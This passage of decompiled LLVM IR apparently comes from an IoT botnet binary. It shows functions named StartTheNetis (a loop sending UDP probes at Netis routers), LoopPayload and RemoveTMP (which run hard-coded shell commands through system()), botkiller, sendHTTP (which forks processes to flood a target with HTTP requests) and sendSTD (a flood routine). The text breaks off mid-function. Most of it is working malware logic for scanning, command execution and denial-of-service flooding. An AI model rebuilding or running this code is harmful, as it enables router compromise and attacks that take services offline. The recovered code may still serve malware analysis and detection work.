  %v4_f3f8 = inttoptr i32 %v3_f3f8 to i8*
  store i8 1, i8* %v4_f3f8, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_f400:                                ; preds = %dec_label_pc_e094
  %v2_f408 = call i32 @time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v2_f428 = mul i32 %storemerge612, 28
  %v2_f430 = add i32 %v2_f388, %v2_f428
  %v2_f434 = inttoptr i32 %v2_f430 to i32*
  store i32 %v2_f408, i32* %v2_f434, align 4
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v1_f450 = inttoptr i32 %v2_e048 to i32*
  %v2_f450 = load i32, i32* %v1_f450, align 4
  store i32 %v2_f450, i32* @r4, align 4
  %v2_f458 = load i32, i32* bitcast ([703 x i8]** @global_var_2e0e0.534 to i32*), align 4
  store i32 %v2_f458, i32* @r5, align 4
  store i32 %v2_f458, i32* %r3.global-to-local, align 4
  %v1_f464 = inttoptr i32 %v2_f458 to i8*
  %v3_f468 = call i32 @strlen(i8* %v1_f464)
  %v0_f470 = load i32, i32* @r4, align 4
  %v0_f474 = load i32, i32* @r5, align 4
  store i32 %v3_f468, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp48 = inttoptr i32 %v0_f474 to i32*
  %v6_f480 = call i32 @__libc_send(i32 %v0_f470, i32* %tmp48, i32 %v3_f468, i32 16384)
  %v1_f488 = icmp slt i32 %v6_f480, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_f488, label %dec_label_pc_f490, label %dec_label_pc_f508

dec_label_pc_f490:                                ; preds = %dec_label_pc_f400
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_f4a8 = load i32, i32* %v1_f450, align 4
  store i32 %v2_f4a8, i32* %r3.global-to-local, align 4
  %v3_f4b0 = call i32 @sclose(i32 %v2_f4a8, i32 %v3_df4c, i32 %v3_e03c)
  %v2_f4d0 = add i32 %v2_e048, 8
  %v3_f4d8 = inttoptr i32 %v2_f4d0 to i8*
  store i8 0, i8* %v3_f4d8, align 4
  store i32 %v2_f4d0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f500 = add i32 %v2_e048, 9
  %v4_f500 = inttoptr i32 %v3_f500 to i8*
  store i8 1, i8* %v4_f500, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_f508:                                ; preds = %dec_label_pc_f400
  %v2_f524 = add i32 %v2_e048, 8
  %v3_f52c = add i32 %v2_e048, 9
  %v4_f52c = inttoptr i32 %v3_f52c to i8*
  store i8 3, i8* %v4_f52c, align 1
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  %v2_f54c = add i32 %v2_e044, %v2_f388
  store i32 %v2_f54c, i32* %r3.global-to-local, align 4
  %v1_f550 = inttoptr i32 %v2_f54c to i32*
  %v2_f550 = load i32, i32* %v1_f550, align 4
  store i32 %v2_f550, i32* %r3.global-to-local, align 4
  %v1_f554 = add i32 %v2_f550, 60
  store i32 %v1_f554, i32* @r4, align 4
  %v2_f55c = call i32 @time(i32* null)
  store i32 %v2_f55c, i32* %r3.global-to-local, align 4
  %v0_f564 = load i32, i32* @r4, align 4
  %v3_f564 = icmp ult i32 %v0_f564, %v2_f55c
  br i1 %v3_f564, label %dec_label_pc_f56c, label %dec_label_pc_f5bc

dec_label_pc_f56c:                                ; preds = %dec_label_pc_f508
  %v3_f590 = inttoptr i32 %v2_f524 to i8*
  store i8 0, i8* %v3_f590, align 4
  store i32 %v2_f524, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v4_f52c, align 1
  br label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_e8ec, %dec_label_pc_ea94, %dec_label_pc_edd0, %dec_label_pc_f370, %dec_label_pc_f508, %dec_label_pc_e094, %dec_label_pc_e348, %dec_label_pc_f490, %dec_label_pc_f3ac, %dec_label_pc_f31c, %dec_label_pc_f1a8, %dec_label_pc_f17c, %dec_label_pc_f0ec, %dec_label_pc_efec, %dec_label_pc_ef98, %dec_label_pc_ef08, %dec_label_pc_ee0c, %dec_label_pc_eda4, %dec_label_pc_ed78, %dec_label_pc_ecb0, %dec_label_pc_ec5c, %dec_label_pc_ebcc, %dec_label_pc_ead0, %dec_label_pc_ea68, %dec_label_pc_ea3c, %dec_label_pc_e928, %dec_label_pc_e874, %dec_label_pc_e754, %dec_label_pc_e6dc, %dec_label_pc_e504, %dec_label_pc_e4b4, %dec_label_pc_e31c, %dec_label_pc_e2c4, %dec_label_pc_f56c
  %v1_f5c0 = add nuw nsw i32 %storemerge612, 1
  store i32 %v1_f5c0, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v5_f5d4 = icmp slt i32 %v1_f5c0, 1000
  br i1 %v5_f5d4, label %dec_label_pc_e030, label %dec_label_pc_e024

; uselistorder directives
  uselistorder i32 %v1_f5c0, { 1, 0, 2 }
  uselistorder i32 %v3_f468, { 1, 0 }
  uselistorder i32 %v2_f338, { 0, 10, 4, 3, 5, 6, 7, 8, 2, 1, 9 }
  uselistorder i32 %v3_eee0, { 1, 0 }
  uselistorder i32 %v2_ee98, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_edc0, { 1, 0, 2 }
  uselistorder i32 %v3_eba4, { 1, 0 }
  uselistorder i32 %v2_eb5c, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_ea84, { 1, 0, 2 }
  uselistorder i32 %v2_e76c, { 2, 1, 0 }
  uselistorder i32* %v1_e5ac, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge711, { 1, 0 }
  uselistorder i32 %v0_e19c, { 1, 0 }
  uselistorder i32 %v2_e130, { 1, 0 }
  uselistorder i8* %v2_e104, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_e100, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i8 %v2_e0b4, { 1, 0 }
  uselistorder i32 %v0_e078, { 1, 0 }
  uselistorder i32* %v1_e050, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_e04c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v2_e048, { 4, 5, 78, 79, 80, 82, 81, 63, 64, 65, 73, 74, 66, 67, 71, 72, 70, 69, 68, 3, 75, 77, 76, 56, 57, 58, 55, 60, 59, 62, 61, 49, 50, 52, 51, 54, 53, 42, 43, 44, 41, 46, 45, 48, 47, 35, 36, 38, 37, 40, 39, 28, 29, 30, 25, 26, 27, 18, 19, 20, 22, 23, 21, 24, 31, 32, 34, 33, 7, 8, 9, 10, 12, 11, 15, 1, 2, 14, 13, 0, 17, 16, 6 }
  uselistorder i32 %v2_e044, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_e03c, { 66, 64, 65, 63, 49, 62, 61, 59, 60, 58, 57, 55, 56, 54, 52, 53, 50, 51, 48, 47, 46, 45, 44, 43, 40, 41, 42, 39, 38, 37, 36, 35, 34, 31, 32, 33, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge612, { 2, 5, 0, 7, 6, 8, 9, 10, 11, 12, 15, 14, 13, 4, 3, 1 }
  uselistorder i32 %v2_f388, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_e558, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_e3a0, { 1, 0 }
  uselistorder i32 %v1_e00c, { 1, 0, 2 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %v3_df4c, { 3, 7, 6, 5, 4, 8, 9, 12, 11, 10, 13, 0, 14, 1, 17, 18, 19, 16, 2, 15 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-616, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 163, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 16, 33, 34, 36, 35, 37, 38, 39, 42, 40, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 58, 59, 62, 64, 63, 65, 66, 60, 69, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 88, 85, 86, 89, 91, 90, 92, 93, 87, 96, 94, 95, 97, 98, 99, 102, 100, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 114, 115, 113, 116, 117, 118, 119, 120, 121, 122, 123, 124, 173, 125, 126, 127, 128, 129, 130, 133, 131, 132, 134, 135, 136, 137, 138, 139, 140, 142, 141, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 174, 165, 164, 175, 166, 167, 168, 170, 169, 172, 171 }
  uselistorder i32* %r2.global-to-local, { 116, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 119, 117, 120, 118 }
  uselistorder i32 (i32, i32, i32)* @get_telstate_host, { 1, 0 }
  uselistorder i32 ptrtoint ([23 x i8*]* @global_var_2e088.525 to i32), { 2, 4, 3, 5, 0, 6, 1, 7 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_20560.523 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([45 x i8*]* @global_var_2e030.521 to i32), { 2, 4, 3, 5, 0, 6, 1, 7 }
  uselistorder i32 (i32, i32, i32)* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder label %dec_label_pc_f5bc, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e56c, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0 }
  uselistorder label %dec_label_pc_e094, { 1, 0 }
  uselistorder label %dec_label_pc_e030, { 1, 0 }
  uselistorder label %dec_label_pc_df90, { 1, 0 }
}

define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 62988, i32* %stack_var_-4, align 4
  %v2_f608 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f608, i32* @fp, align 4
  %v2_f680 = bitcast i32* %stack_var_-44 to i8*
  %v2_f694 = ptrtoint i32* %stack_var_-1076 to i32
  %tmp20 = bitcast i32* %stack_var_-1076 to i8*
  %v2_f6c0 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_f614

dec_label_pc_f614:                                ; preds = %dec_label_pc_f614, %entry
  %v0_f620 = call i32 @socket()
  %v0_f62c = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-52, align 4
  %v1_f650 = call i32 @__GI_htons(i32 ptrtoint (i32* @global_var_d0a5.535 to i32))
  store i32 8, i32* @r2, align 4
  %v3_f680 = call i32 @__GI_memset(i8* %v2_f680, i32 0)
  store i32 %v2_f694, i32* @r0, align 4
  %v3_f6a4 = call i32 @sprintf(i32 %v2_f694, i32 ptrtoint ([711 x i8]* @global_var_205e0.537 to i32))
  %v3_f6b8 = call i32 @strlen(i8* %tmp20)
  %v7_f6ec = call i32 @__libc_sendto(i32 %v0_f620, i32* nonnull %stack_var_-1076, i32 %v3_f6b8, i32 0, i32 %v2_f6c0, i32 16)
  br label %dec_label_pc_f614

; uselistorder directives
  uselistorder i32 %v2_f694, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %v3_f700 = load i32, i32* @fp, align 4
  %v2_f724 = call i32 @__libc_system(i32 ptrtoint ([704 x i8]* @global_var_208b0.541 to i32))
  store i32 %v3_f700, i32* @fp, align 4
  ret i32 %v2_f724
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2184 = alloca i32, align 4
  %stack_var_-2312 = alloca i32, align 4
  %stack_var_-2024 = alloca i32, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f740 = load i32, i32* @r4, align 4
  store i32 %v3_f740, i32* %stack_var_-20, align 4
  %v6_f740 = load i32, i32* @fp, align 4
  store i32 63304, i32* %stack_var_-4, align 4
  %v16_f740 = ptrtoint i32* %stack_var_-20 to i32
  %v2_f744 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f744, i32* @fp, align 4
  %v21_f768 = ptrtoint i8** %stack_var_-40 to i32
  store i32 %v21_f768, i32* @lr, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2251c.551, i32 0, i32 0), i8** %stack_var_-40, align 4
  %v2_f778 = ptrtoint i32* %stack_var_-1060 to i32
  store i32 %v2_f778, i32* @r0, align 4
  store i32 ptrtoint ([247 x i8*]* @global_var_220f0.803 to i32), i32* @r1, align 4
  store i32 988, i32* @r2, align 4
  %v0_f78c = call i32 @memcpy()
  %v2_f798 = ptrtoint i32* %stack_var_-2024 to i32
  store i32 %v2_f798, i32* @r0, align 4
  store i32 ptrtoint ([241 x i8*]* @global_var_214cc.1031 to i32), i32* @r1, align 4
  store i32 964, i32* @r2, align 4
  %v0_f7ac = call i32 @memcpy()
  %v6_f7c4 = icmp sgt i32 %tmp12, 0
  br i1 %v6_f7c4, label %dec_label_pc_f7c8, label %dec_label_pc_f97c

dec_label_pc_f7c8:                                ; preds = %entry
  %v2_f7cc = ptrtoint i32* %stack_var_-2312 to i32
  store i32 128, i32* @r2, align 4
  %v2_f7dc = bitcast i32* %stack_var_-2312 to i8*
  %v3_f7dc = call i32 @__GI_memset(i8* %v2_f7dc, i32 0)
  %v2_f800 = add i32 %v16_f740, -52
  %v1_f804 = inttoptr i32 %v2_f800 to i32*
  %v2_f804 = load i32, i32* %v1_f804, align 4
  store i32 %v2_f804, i32* @lr, align 4
  store i32 %v16_f740, i32* @r4, align 4
  store i32 %v2_f7cc, i32* @r0, align 4
  store i32 127, i32* @r1, align 4
  %v7_f8a4 = call i32 @__GI_snprintf(i32 %v2_f7cc, i32 127, i32 ptrtoint ([100 x i8]* @global_var_2254c.1033 to i32), i32 %v2_f804, i32 %v2_f804, i32 %v2_f804)
  %v1_f930 = call i32 @__libc_system(i32 %v2_f7cc)
  store i32 %v16_f740, i32* @lr, align 4
  %v2_f958 = ptrtoint i32* %stack_var_-2184 to i32
  store i32 %v2_f958, i32* @r0, align 4
  %v3_f964 = call i32 @sprintf(i32 %v2_f958, i32 ptrtoint ([14 x i8]* @global_var_225d0.1037 to i32))
  %v1_f974 = call i32 @__libc_system(i32 %v2_f958)
  br label %dec_label_pc_f984

dec_label_pc_f97c:                                ; preds = %entry
  %v1_f980 = call i32 @sleep(i32 5)
  br label %dec_label_pc_f984

dec_label_pc_f984:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_f97c
  %storemerge10 = phi i32 [ %v1_f980, %dec_label_pc_f97c ], [ %v1_f974, %dec_label_pc_f7c8 ]
  %v2_f988 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f988, i32* @r4, align 4
  store i32 %v6_f740, i32* @fp, align 4
  ret i32 %storemerge10

; uselistorder directives
  uselistorder i32 %v2_f958, { 0, 2, 1 }
  uselistorder i32 %v2_f804, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f7cc, { 0, 2, 1 }
  uselistorder i32 %v16_f740, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 1, 0 }
  uselistorder label %dec_label_pc_f984, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_f9a8 = load i32, i32* @fp, align 4
  store i32 %v3_f9a8, i32* %stack_var_-16, align 4
  %v2_f9b4 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_225e0.1039 to i32))
  %v2_f9bc = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_2260c.1041 to i32))
  %v2_f9c4 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_22624.1043 to i32))
  %v2_f9cc = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_2260c.1041 to i32))
  %v2_f9d4 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_2263c.1045 to i32))
  %v2_f9dc = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_2264c.1047 to i32))
  %v2_f9e4 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_22658.1049 to i32))
  %v2_f9ec = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_22670.1051 to i32))
  %v2_f9f4 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_22684.1053 to i32))
  %v2_f9fc = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_22690.1055 to i32))
  %v2_fa04 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_226a4.1057 to i32))
  %v2_fa0c = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_226b4.1059 to i32))
  %v2_fa14 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_226cc.1061 to i32))
  %v2_fa18 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fa18, i32* @fp, align 4
  ret i32 %v2_fa14

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_fa50 = load i32, i32* @fp, align 4
  store i32 64088, i32* %stack_var_-4, align 4
  %v2_fa54 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fa54, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_fa7c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_fa8c = icmp eq i32 %v1_fa7c, 0
  br i1 %v2_fa8c, label %dec_label_pc_fa94, label %dec_label_pc_faa0

dec_label_pc_fa94:                                ; preds = %entry
  br label %dec_label_pc_fb88

dec_label_pc_faa0:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_faa4 = add i32 %v1_fa7c, 16
  %v2_faa4 = inttoptr i32 %v1_faa4 to i32*
  %v3_faa4 = load i32, i32* %v2_faa4, align 4
  %v1_faa8 = inttoptr i32 %v3_faa4 to i32*
  %v2_faa8 = load i32, i32* %v1_faa8, align 4
  %v1_fab0 = add i32 %v1_fa7c, 12
  %v2_fab0 = inttoptr i32 %v1_fab0 to i32*
  %v3_fab0 = load i32, i32* %v2_fab0, align 4
  store i32 %v3_fab0, i32* @r2, align 4
  %v2_fabc = ptrtoint i32* %stack_var_-36 to i32
  %v5_fac8 = call i32 @bcopy(i32 %v2_faa8, i32 %v2_fabc, i32 %v3_fab0, i32 %v2_fabc, i32 %v1_fa7c)
  %v1_fae0 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_fb10 = call i32 @socket()
  %v6_fb38 = call i32 @__GI_setsockopt(i32 %v0_fb10, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_fb40 = icmp eq i32 %v0_fb10, -1
  br i1 %v3_fb40, label %dec_label_pc_fb48, label %dec_label_pc_fb54

dec_label_pc_fb48:                                ; preds = %dec_label_pc_faa0
  br label %dec_label_pc_fb88

dec_label_pc_fb54:                                ; preds = %dec_label_pc_faa0
  %v3_fb64 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_fb64 = call i32 @__libc_connect(i32 %v0_fb10, %sockaddr* %v3_fb64, i32 16)
  %v3_fb6c = icmp eq i32 %v4_fb64, -1
  br i1 %v3_fb6c, label %dec_label_pc_fb74, label %dec_label_pc_fb80

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fb54
  br label %dec_label_pc_fb88

dec_label_pc_fb80:                                ; preds = %dec_label_pc_fb54
  br label %dec_label_pc_fb88

dec_label_pc_fb88:                                ; preds = %dec_label_pc_fb74, %dec_label_pc_fb48, %dec_label_pc_fa94, %dec_label_pc_fb80
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_fa94 ], [ 0, %dec_label_pc_fb48 ], [ 0, %dec_label_pc_fb74 ], [ %v0_fb10, %dec_label_pc_fb80 ]
  store i32 %v3_fa50, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_fb88, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-804 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_fb9c = load i32, i32* @r4, align 4
  store i32 %v3_fb9c, i32* %stack_var_-20, align 4
  %v6_fb9c = load i32, i32* @fp, align 4
  store i32 64420, i32* %stack_var_-4, align 4
  %v16_fb9c = ptrtoint i32* %stack_var_-20 to i32
  %v2_fba0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fba0, i32* @fp, align 4
  %v2_fbc4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_fbc4, i32* @r0, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_23a78.1125 to i32), i32* @r1, align 4
  store i32 248, i32* @r2, align 4
  %v0_fbd8 = call i32 @memcpy()
  %v2_fbf0 = call i32 @time(i32* null)
  %v3_fbf8 = load i32, i32* %stack_var_0, align 4
  %v2_fbfc = add i32 %v3_fbf8, %v2_fbf0
  %v0_fc04 = call i32 @random()
  %v2_fc14 = srem i32 %v0_fc04, 3
  %v3_fc28 = mul nsw i32 %v2_fc14, 4
  %v2_fc30 = add i32 %v3_fc28, %v16_fb9c
  %v2_fc34 = add i32 %v2_fc30, -272
  %v1_fc38 = inttoptr i32 %v2_fc34 to i32*
  %v2_fc38 = load i32, i32* %v1_fc38, align 4
  store i32 %v2_fc38, i32* @r4, align 4
  %v0_fc3c = call i32 @random()
  %v2_fc74 = ptrtoint i32* %stack_var_-804 to i32
  store i32 %v2_fc74, i32* @r0, align 4
  %v3_fc90 = call i32 @sprintf(i32 %v2_fc74, i32 ptrtoint ([62 x i8]* @global_var_23b70.1134 to i32))
  br label %dec_label_pc_fd3c

dec_label_pc_fca0:                                ; preds = %dec_label_pc_fd3c
  %v0_fca0 = call i32 @__libc_fork()
  %v2_fca8 = icmp eq i32 %v0_fca0, 0
  %v1_fd34 = add nuw i32 %storemerge2, 1
  br i1 %v2_fca8, label %dec_label_pc_fd3c, label %dec_label_pc_fd10.preheader

dec_label_pc_fd10.preheader:                      ; preds = %dec_label_pc_fca0
  %tmp27 = bitcast i32* %stack_var_-804 to i8*
  br label %dec_label_pc_fd10

dec_label_pc_fcb4:                                ; preds = %dec_label_pc_fd10
  %v5_fcd0 = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_fce0 = icmp eq i32 %v5_fcd0, 0
  br i1 %v2_fce0, label %dec_label_pc_fd10, label %dec_label_pc_fce8

dec_label_pc_fce8:                                ; preds = %dec_label_pc_fcb4
  %v3_fcf0 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_fcf0, i32* @r2, align 4
  %v3_fd04 = call i32 @__GI_write(i32 %v5_fcd0, i32* nonnull %stack_var_-804)
  %v1_fd0c = call i32 @__GI_close(i32 %v5_fcd0)
  br label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fcb4, %dec_label_pc_fce8, %dec_label_pc_fd10.preheader
  %v2_fd14 = call i32 @time(i32* null)
  %v5_fd24 = icmp slt i32 %v2_fd14, %v2_fbfc
  br i1 %v5_fd24, label %dec_label_pc_fcb4, label %dec_label_pc_fd28

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fd10
  %v1_fd2c = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_fd3c:                                ; preds = %dec_label_pc_fca0, %entry
  %v12_fd50 = phi i32 [ %v3_fc90, %entry ], [ 0, %dec_label_pc_fca0 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_fd34, %dec_label_pc_fca0 ]
  %v5_fd48 = icmp slt i32 %storemerge2, %arg6
  br i1 %v5_fd48, label %dec_label_pc_fca0, label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %dec_label_pc_fd3c
  %v2_fd50 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fd50, i32* @r4, align 4
  store i32 %v6_fb9c, i32* @fp, align 4
  ret i32 %v12_fd50

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v5_fcd0, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_fd10, { 1, 0, 2 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fd64 = load i32, i32* @fp, align 4
  store i32 %v3_fd64, i32* %stack_var_-16, align 4
  store i32 64876, i32* %stack_var_-4, align 4
  %v13_fd64 = ptrtoint i32* %stack_var_-16 to i32
  %v2_fd68 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fd68, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_fd88 = call i32 @socket()
  %v2_fd98 = call i32 @time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_fdac = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_fdb8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_fdb8, i32* @r0, align 4
  %v2_fdc4 = call i32 @bzero(i32 %v2_fdb8, i32 16)
  %v1_fdcc = add i32 %v1_fdac, 16
  %v2_fdcc = inttoptr i32 %v1_fdcc to i32*
  %v3_fdcc = load i32, i32* %v2_fdcc, align 4
  %v1_fdd0 = inttoptr i32 %v3_fdcc to i32*
  %v2_fdd0 = load i32, i32* %v1_fdd0, align 4
  %v1_fdd8 = add i32 %v1_fdac, 12
  %v2_fdd8 = inttoptr i32 %v1_fdd8 to i32*
  %v3_fdd8 = load i32, i32* %v2_fdd8, align 4
  store i32 %v3_fdd8, i32* @r2, align 4
  %v2_fde4 = ptrtoint i32* %stack_var_-48 to i32
  %v5_fdf0 = call i32 @bcopy(i32 %v2_fdd0, i32 %v2_fde4, i32 %v3_fdd8, i32 %v2_fde4, i32 ptrtoint (i32* @0 to i32))
  %v1_fdf8 = add i32 %v1_fdac, 8
  %v2_fdf8 = inttoptr i32 %v1_fdf8 to i32*
  %v3_fdf8 = load i32, i32* %v2_fdf8, align 4
  %v3_fe00 = urem i32 %v3_fdf8, 65536
  store i32 %v3_fe00, i32* %stack_var_-52, align 4
  %v2_fe34 = ptrtoint i32* %stack_var_-196 to i32
  %v3_feb0 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_fe70 = add i32 %v13_fd64, -180
  br label %dec_label_pc_fe30

dec_label_pc_fe30:                                ; preds = %dec_label_pc_feec, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_fef0, %dec_label_pc_feec ]
  store i32 %v2_fe34, i32* @r0, align 4
